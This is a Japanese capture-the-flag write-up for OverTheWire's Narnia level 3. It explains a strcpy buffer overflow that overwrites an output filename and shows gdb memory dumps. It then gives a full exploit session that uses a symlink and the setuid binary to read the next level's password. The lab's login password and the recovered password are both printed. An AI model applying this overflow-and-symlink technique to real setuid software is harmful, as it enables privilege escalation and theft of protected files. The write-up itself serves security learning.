```sh
$ ssh -p 2226 narnia3@narnia.labs.overthewire.org
```

password: vaequeezee

```c
.
.
.
int  ifd,  ofd;
char ofile[16] = "/dev/null";
char ifile[32];
char buf[32];

if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
}

/* open files */
strcpy(ifile, argv[1]); <- here is buffer overflow???
.
.
.
```

strcpyした時に、ファイル名が32バイト以上ならばオーバーフローして、ofileを上書きする


### A が 32
```
gdb-peda$ x/10wx 0xffffbf00
0xffffbf00: 0x41414141  0x41414141  0x76656400  0x6c756e2f <- null文字(00)で/dev/nullの先頭が上書きされてしまっている
0xffffbf10: 0x0000006c  0x00000000  0x0804868b  0x00000000
0xffffbf20: 0xf7fab000  0xf7fab000
```


### A が 31
```
gdb-peda$ x/10wx 0xffffbf00
0xffffbf00:	0x41414141	0x00414141	0x7665642f	0x6c756e2f <- /dev/null
0xffffbf10:	0x0000006c	0x00000000	0x0804868b	0x00000000
0xffffbf20:	0xf7fab000	0xf7fab000
```



## In remote
```sh
narnia3@narnia:~$ cd /tmp/
narnia3@narnia:/tmp$ mkdir $(python -c 'print "A" * 27')
narnia3@narnia:/tmp$ cd AAAAAAAAAAAAAAAAAAAAAAAAAAA
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA$ mkdir tmp
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA$ cd tmp
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ln -s /etc/narnia_pass/narnia4 ./hoge
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ls -lh
total 0
lrwxrwxrwx 1 narnia3 narnia3 24 Jul  2 08:48 hoge -> /etc/narnia_pass/narnia4
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ /narnia/narnia3 $(python -c 'print "/tmp/" + "A"*27 + "/tmp/hoge"')
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hoge to a safer place... (/tmp/hoge)
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ cat /tmp/hoge
thaenohtai
�����4����_��}0,narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$
```

/dev/nullが書き換え可能であり、このプログラムは渡されたファイルの内容を/dev/nullにコピーするもの。

よって、/dev/nullを任意のものに書き換えて、パスワードを指すファイル名を渡す。

具体的には、

/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA <- これでnull文字だけオーバーフローしている状態。

/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hoge <- こうすると、/dev/nullが/tmp/hogeになる

さらに、/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hogeがパスワードを指すようにしたいので、/etc/narnia_pass/narnia4へのシンボリックリンクを貼る。

こうすることで、まず/dev/nullが/tmp/hogeに書き換わり、そこに/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hogeの内容、つまり/etc/narnia_pass/narnia_pass4の内容が/tmp/hogeに書き出される。

/etc/narnia_pass/narnia4はnarnia4しか読めないが、/narnia/narnia3にはsetuidが立っているので読むことができる
